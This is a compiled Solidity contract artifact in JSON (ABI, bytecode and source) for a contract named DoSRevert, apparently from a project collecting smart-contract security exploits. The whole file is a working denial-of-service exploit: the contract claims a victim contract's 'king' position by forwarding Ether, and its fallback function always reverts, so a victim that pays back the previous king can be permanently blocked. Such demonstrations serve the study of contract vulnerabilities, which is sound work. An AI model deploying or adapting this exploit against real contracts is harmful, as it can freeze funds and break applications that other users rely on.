{
  "contractName": "DoSRevert",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "victim",
          "type": "address"
        }
      ],
      "name": "becomeKing",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610128806100206000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063a64c9af0146044575b600080fd5b6076600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506078565b005b60008190508073ffffffffffffffffffffffffffffffffffffffff16636708cc63346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801560e057600080fd5b505af115801560f3573d6000803e3d6000fd5b505050505050505600a165627a7a723058209e5fe5d49e096ee1204b0b29603e8f5e3b185918802de29611068839f9a579bc0029",
  "source": "pragma solidity ^0.4.19;\n\ncontract DoSRevert {\n  function becomeKing(address victim) payable {\n    Victim _victim = Victim(victim);\n    _victim.becomeKing.value(msg.value)();\n  }\n\n  function () payable {\n    revert();\n  }\n}\n\ncontract Victim {\n  function becomeKing() payable;\n}",
  "sourcePath": "/home/hayek/proj/security-exploits/contracts/DoSRevert/DoSRevert.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.23+commit.124ca40d.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-06-24T04:16:54.712Z"
}